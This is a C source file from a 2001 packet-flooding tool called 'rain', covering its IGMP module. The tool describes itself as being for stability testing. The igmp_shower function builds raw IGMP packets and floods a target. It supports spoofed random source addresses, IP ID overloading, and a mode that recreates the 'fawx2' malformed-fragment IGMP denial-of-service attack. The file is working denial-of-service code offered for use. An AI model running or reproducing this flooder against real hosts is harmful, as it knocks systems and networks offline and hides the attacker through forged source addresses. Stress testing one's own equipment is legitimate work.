/*--------------------------------------------------*
 * $Header: /usr/src/Projects/rain/RCS/rain_igmp.c,v 1.1 2001/06/11 20:44:09 root Exp root $
 * $Author: root $
 * rain_igmp.c
 * rain - by Evil (mystic@tenebrous.com)
 * A flexible packet flooder for testing stability.
 * Copyright(c) 2001
 * Licensed under the GNU General Public License
 *
 * $Log: rain_igmp.c,v $
 * Revision 1.1  2001/06/11 20:44:09  root
 * Initial revision
 *
 * Revision 1.1  2001/06/11 02:59:26  root
 * Initial revision
 *
 *-------------------------------------------------*/
#include "rain_common.h"

	

/*
 * Prints IGMP type/code descriptions
 */
extern void 
print_igmp_info(void) {
  printf("\n[ rain %s by Evil (mystic@tenebrous.com) ] [pid:%d]\n", RAIN_VERSION, getpid());
  printf("\n"
         "       IGMP type/code combinations          \n"
         "       ---------------------------        \n\n"
         "Membership query...........: Type %d, Code 0\n"
         "Version 1 membership report: Type %d, Code 0\n"
         "Version 2 membership report: Type %d, Code 0\n"
         "Version 2 leave group......: Type %d, Code 0\n",
         IGMP_MEMBERSHIP_QUERY,IGMP_V1_MEMBERSHIP_REPORT,
         IGMP_V2_MEMBERSHIP_REPORT,IGMP_V2_LEAVE_GROUP);

  exit(0);
}


/*
 * Stores IGMP type/code combinations
 * into a array of text strings
 */
extern void
igmp_info_init(struct pkt_info_igmp *pktigmp) {

  if(pktigmp->type == IGMP_MEMBERSHIP_QUERY)
    strcpy(igmpinfo[IGMP_MEMBERSHIP_QUERY][pktigmp->code]," membership query");

  else if(pktigmp->type == IGMP_V1_MEMBERSHIP_REPORT)
    strcpy(igmpinfo[IGMP_V1_MEMBERSHIP_REPORT][pktigmp->code]," version 1 membership report");

  else if(pktigmp->type == IGMP_V2_MEMBERSHIP_REPORT)
    strcpy(igmpinfo[IGMP_V2_MEMBERSHIP_REPORT][pktigmp->code]," version 2 membership report");

  else if(pktigmp->type == IGMP_V2_LEAVE_GROUP)
    strcpy(igmpinfo[IGMP_V2_LEAVE_GROUP][pktigmp->code]," leave group");
  else
    strcpy(igmpinfo[pktigmp->type][pktigmp->code], " unknown type");


  switch(pktigmp->code) {
    case 0 : { break; }
    default: { 
      if(pktigmp->type != 17) strcat(igmpinfo[pktigmp->type][pktigmp->code], " / unknown code"); 
      break;
    }
  }

}

/*
 * igmp_shower():
 *
 * Sends fully customized IGMP
 * packets to a target:port
 */
extern int
igmp_shower(int raw_socket, struct sockaddr_in *source, struct sockaddr_in *target, struct pkt_info *pkt, struct pkt_info_igmp *pktigmp) {
  struct ipigmp *ip_igmp;  
  struct ip          *ip;
  struct igmp      *igmp;
  int i = 0;



  packetsize -= sizeof(struct igmp);

  /*
   * We use a global buffer to ward off memory leaks
   * it will be freed when the program exits
   */
  buffer = malloc(sizeof(char)*packetsize);
  if(!buffer) DieWithError("malloc()", ENOMEM);
  memset(buffer, pkt->filler, (sizeof(char)*packetsize));


  ip_igmp = (struct ipigmp*)buffer;
  ip      =           &ip_igmp->ip;
  igmp    =         &ip_igmp->igmp;



  /* 
   * store the user-specified string in the payload, 
   * if there is one.. 
   */
  if(ctoi(pkt->payload[0]) != 0) {
   for(; i < strlen(pkt->payload); i++)
     buffer[(sizeof(struct ip) + sizeof(struct igmp)) + i] = pkt->payload[i];
  }


  pkt->tot_len = (sizeof(struct igmp) + strlen(buffer));


  /* 
   * Build the IGMP header..
   */
  igmp->igmp_type         = pktigmp->type;
  igmp->igmp_code         = pktigmp->code;

  /*
   * If this isn't a membership query, 
   * we'll specify the group address
   */
  if(pktigmp->type != 17)  {
    if(ctoi(pkt->gaddr[0]) == 0) {
      printf("zero\n");
      igmp->igmp_group.s_addr = (in_addr_t)rand();
    } else {
      resolv_nosin(pkt->gaddr,&igmp->igmp_group);
    }
  }
  igmp->igmp_cksum        = in_cksum((u_short*)igmp, sizeof(struct igmp), 0);
  
  pkt->tot_len += sizeof(struct ip);


  /* 
   * Now the IP header
   */
  ip->ip_hl         = (sizeof(struct ip) >> 2);
  ip->ip_v          = 4;
  ip->ip_tos        = pkt->tos;
  ip->ip_len        = BYTE_FIX(pkt->tot_len);
  ip->ip_id         = BYTE_FIX(pkt->id);
  if(pkt->frag == 1) {
    ip->ip_off  = BYTE_FIX(pkt->frag_off); /* set fragment offset */
    ip->ip_off |= BYTE_FIX(IP_MF);  /* set more to come */
    if(pkt->frag_off == 0) ip->ip_off = 0x0;
  } else {
    ip->ip_off = 0x0;
  }
  if(pkt->dfrag == 1) ip->ip_off |= BYTE_FIX(IP_DF);
  ip->ip_ttl        = pkt->ttl;
  ip->ip_p          = IPPROTO_IGMP;
  if(strcmp(pkt->saddr,"127.0.0.1") == 0)
    ip->ip_src.s_addr = INADDR_ANY;
  else
    ip->ip_src.s_addr = source->sin_addr.s_addr;
  ip->ip_dst.s_addr = target->sin_addr.s_addr;
  ip->ip_sum        = 0x0;
  ip->ip_sum        = in_cksum((u_int16_t*)ip,sizeof(struct ip), 0);


  /*
   * Cool. Let's send the packets
   */
  while(packets_sent < pkt->num) {
    /* send first packet */
    if(sendto(raw_socket,
              ip_igmp,
              pkt->tot_len,
              0,
              (struct sockaddr*)target,
              sizeof(struct sockaddr_in)) < 0) return -1;
    usleep(pkt->delay);

  /* for simulated attacks */
    if(pkt->simulate == 1) {
      if(pkt->simtype == 0) { /* fawx2.c */ 
        ip->ip_off  = BYTE_FIX(8 >> 3);
        ip->ip_off |= BYTE_FIX(0x2001);
        ip->ip_sum     = in_cksum((u_short*)ip, sizeof(struct ip), 0);
        igmp->igmp_type  =  2;
        igmp->igmp_code  = 31;
        igmp->igmp_cksum = in_cksum((u_short*)igmp, sizeof(struct igmp), 0);
    
            /* send second packet (simulating fawx2) */
            if(sendto(raw_socket,
                      ip_igmp,
                      pkt->tot_len,
                      0,
                      (struct sockaddr*)target,
                      sizeof(struct sockaddr_in)) < 0) return -1;
            packets_sent++;
      }
    }
  /* simulated attacks END */

    /* 
     * For random IP 
     */
    if(pkt->randip == 1) {
      ip->ip_src.s_addr = rand();
      ip->ip_sum = in_cksum((u_int16_t*)ip,sizeof(struct ip), 0);
    }

    /* 
     * for id overloading 
     */
    if(pkt->id_of == 1) { 
      ip->ip_id++; 
      ip->ip_id = BYTE_FIX(ip->ip_id) ; 
      ip->ip_sum = in_cksum((u_short*)ip, sizeof(struct ip), 0); } 


    usleep(pkt->delay);

    packets_sent++;
  }

  return 0;
}
